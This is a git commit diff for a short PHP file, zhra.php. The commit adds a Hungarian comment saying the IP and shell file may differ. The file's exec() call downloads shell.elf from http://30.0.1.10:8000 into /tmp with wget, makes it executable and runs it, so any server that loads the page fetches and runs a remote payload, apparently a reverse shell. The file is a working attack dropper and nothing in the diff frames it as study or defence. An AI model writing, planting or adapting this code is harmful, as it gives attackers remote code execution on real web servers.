32ad660776e741d2132c712161b9a6c2e5c327a4
katonaimi <71077739+katonaimi@users.noreply.github.com>
2025-10-14 10:48:56 +0000

    Update zhra.php

--- zhra.php
+++ zhra.php
@@ -1,6 +1,7 @@
 <?php
 $output=null;
 $retval=null;
+//IP és shell file lehet más!
 exec('cd /tmp;rm -f /tmp/shell.elf;wget http://30.0.1.10:8000/shell.elf;chmod +x /tmp/shell.elf;/tmp/shell.elf', $output, $retval);
 echo "Returned with status $retval and output:\n";
 print_r($output);
